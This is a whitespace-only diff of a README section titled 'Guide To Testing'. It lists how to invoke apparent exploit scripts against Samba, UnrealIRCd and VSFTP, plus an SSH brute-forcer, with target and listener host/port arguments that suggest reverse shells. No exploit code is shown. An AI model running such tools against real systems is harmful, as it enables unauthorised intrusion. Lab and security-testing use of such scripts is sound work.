@@ -45,15 +45,15 @@ When presenting these examples I will be going through these steps
 
 # Guide To Testing:
 - Samba:
- - Python3 samba.py
- - [RHOST] [RPORT] [LHOST] [LPORT]
+  - Python3 samba.py
+  - [RHOST] [RPORT] [LHOST] [LPORT]
 - SSH:
  - Python3 sshBruteForce.py
- - "[RHOST]"
- - "[RPORT]"
+   - "[RHOST]"
+   - "[RPORT]"
 - UnrealRCD:
- - Python3 unrealIRCD.py
- - [RHOST] [RPORT] [LHOST] [LPORT]
+  - Python3 unrealIRCD.py
+  - [RHOST] [RPORT] [LHOST] [LPORT]
 - VSFTP:
- - Python3 ftpExploit.py
- - [RHOST] [RPORT] [COMMAND]
+  - Python3 ftpExploit.py
+  - [RHOST] [RPORT] [COMMAND]
